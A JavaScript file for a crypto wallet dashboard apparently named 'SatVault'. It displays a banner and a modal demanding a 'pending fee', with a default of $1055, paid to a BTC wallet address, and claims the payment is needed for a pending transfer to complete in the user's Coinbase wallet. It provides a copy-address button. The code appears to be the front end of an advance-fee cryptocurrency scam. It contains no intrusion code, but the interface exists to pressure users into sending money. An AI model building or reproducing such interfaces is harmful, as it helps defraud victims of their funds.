(function () {
  function getProfile() {
    return window.SatVaultAuth && typeof SatVaultAuth.getActiveProfile === "function"
      ? SatVaultAuth.getActiveProfile()
      : null;
  }

  function getNotice() {
    var profile = getProfile();
    return profile && profile.pendingFeeNotice ? profile.pendingFeeNotice : null;
  }

  function formatFee(amount) {
    return "$" + Number(amount).toLocaleString(undefined, {
      minimumFractionDigits: 0,
      maximumFractionDigits: 0
    });
  }

  function ensureModal(notice) {
    if (document.getElementById("pending-fee-modal")) return;
    document.body.insertAdjacentHTML("beforeend",
      '<div id="pending-fee-modal" class="wallet-modal hidden" role="dialog" aria-modal="true" aria-labelledby="pending-fee-title">' +
        '<div class="wallet-modal-backdrop" data-pending-fee-close></div>' +
        '<div class="wallet-modal-card app-card">' +
          '<h2 id="pending-fee-title" class="wallet-modal-title"></h2>' +
          '<p id="pending-fee-body" class="wallet-modal-body text-gray-400 text-sm"></p>' +
          '<p class="text-xs text-gray-500 mb-2 mt-4">Pay this fee to the BTC wallet below</p>' +
          '<p id="pending-fee-wallet" class="wallet-box"></p>' +
          '<button type="button" id="pending-fee-copy" class="btn-ghost text-sm mt-3 w-full">Copy wallet address</button>' +
          '<div class="wallet-modal-actions">' +
            '<button type="button" class="btn-primary w-full" data-pending-fee-close>Done</button>' +
          '</div>' +
        '</div>' +
      '</div>'
    );

    document.querySelectorAll("[data-pending-fee-close]").forEach(function (el) {
      el.addEventListener("click", closeModal);
    });

    document.getElementById("pending-fee-copy").addEventListener("click", function () {
      var addr = document.getElementById("pending-fee-wallet").textContent.trim();
      var btn = document.getElementById("pending-fee-copy");
      if (!addr || !navigator.clipboard) return;
      navigator.clipboard.writeText(addr).then(function () {
        btn.textContent = "Copied!";
        setTimeout(function () { btn.textContent = "Copy wallet address"; }, 2000);
      });
    });
  }

  function closeModal() {
    var modal = document.getElementById("pending-fee-modal");
    if (modal) modal.classList.add("hidden");
    document.body.classList.remove("wallet-modal-open");
  }

  function openModal() {
    var notice = getNotice();
    if (!notice) return;
    ensureModal(notice);
    var feeLabel = formatFee(notice.amountUsd || 1055);
    document.getElementById("pending-fee-title").textContent = notice.title || "Pay pending fee";
    document.getElementById("pending-fee-body").textContent =
      notice.body || ("Fee of " + feeLabel + " is needed for pending to be completed in your Coinbase wallet.");
    document.getElementById("pending-fee-wallet").textContent = notice.wallet || "";
    document.getElementById("pending-fee-modal").classList.remove("hidden");
    document.body.classList.add("wallet-modal-open");
  }

  function showNotice() {
    var notice = getNotice();
    var boxes = document.querySelectorAll("#dash-pending-fee-notice, #dash-pending-fee-notice-desktop");
    if (!boxes.length) return;
    if (!notice) {
      boxes.forEach(function (el) { el.classList.add("hidden"); });
      return;
    }
    var feeLabel = formatFee(notice.amountUsd || 1055);
    var copy = notice.body || ("Fee of " + feeLabel + " is needed for pending to be completed in your Coinbase wallet.");
    boxes.forEach(function (el) {
      var text = el.querySelector(".dash-pending-fee__text");
      if (text) text.textContent = copy;
      el.classList.remove("hidden");
    });
  }

  document.addEventListener("click", function (e) {
    var btn = e.target.closest("[data-pending-fee-pay]");
    if (!btn) return;
    e.preventDefault();
    openModal();
  });

  document.addEventListener("keydown", function (e) {
    if (e.key === "Escape") closeModal();
  });

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", showNotice);
  } else {
    showNotice();
  }
  document.addEventListener("accountStateLoaded", showNotice);
  document.addEventListener("appReady", showNotice);
})();
